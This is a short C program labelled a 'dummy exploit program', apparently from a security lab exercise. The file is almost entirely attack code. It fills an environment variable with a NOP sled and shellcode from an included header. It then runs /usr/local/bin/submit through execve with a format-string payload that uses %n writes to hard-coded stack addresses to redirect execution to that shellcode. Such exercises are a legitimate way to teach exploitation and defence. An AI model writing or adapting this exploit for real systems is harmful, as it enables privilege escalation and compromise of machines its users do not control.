/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define SUBMIT "/usr/local/bin/submit"
#define NOP 0x90
#define PAYLOAD_SIZE 512

#define EVIL "\x5e\xdc\xbf\xff\x5c\xdc\xbf\xff%56792c%101$n%08671c%0100$n"

int main(int argc, char **argv) {
	char *args[4], *ptr;
	char *envs[2];
	char *evil = EVIL;
	char buf[PAYLOAD_SIZE];
	const int slen = strlen(shellcode);

	/* Construct the payload */
	memset(buf, NOP, PAYLOAD_SIZE);
	ptr = buf + 128;
	memcpy(ptr, shellcode, slen);

	/* Set up arguments */
	args[0] = "/usr/local/bin/submit";
	args[1] = evil;
	args[2] = "whatever";
	args[3] = NULL;

	/* Environment variable stores the payload */
	envs[0] = buf;
	envs[1] = NULL;

	return execve(args[0], args, envs);
}
